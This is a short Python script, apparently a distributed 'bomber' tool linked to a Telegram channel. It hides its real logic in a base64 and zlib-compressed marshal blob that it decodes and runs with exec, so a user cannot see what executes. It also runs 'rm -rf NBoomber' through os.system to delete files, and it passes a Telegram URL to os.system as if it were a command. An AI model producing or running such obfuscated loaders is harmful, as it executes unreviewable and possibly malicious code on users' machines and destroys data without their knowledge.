
import marshal
import zlib
import base64
import os 
os.system("https://t.me/echo_typhoon")
os.system("rm -rf NBoomber")

# The encoded script (you can paste the content from the encoded_script.py)
encoded_script = '''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'''

# Decode the base64 encoded string
decoded_data = base64.b64decode(encoded_script)

# Decompress the data using zlib
decompressed_data = zlib.decompress(decoded_data)

# Deserialize the bytecode using marshal
code_object = marshal.loads(decompressed_data)

# Execute the script
exec(code_object)
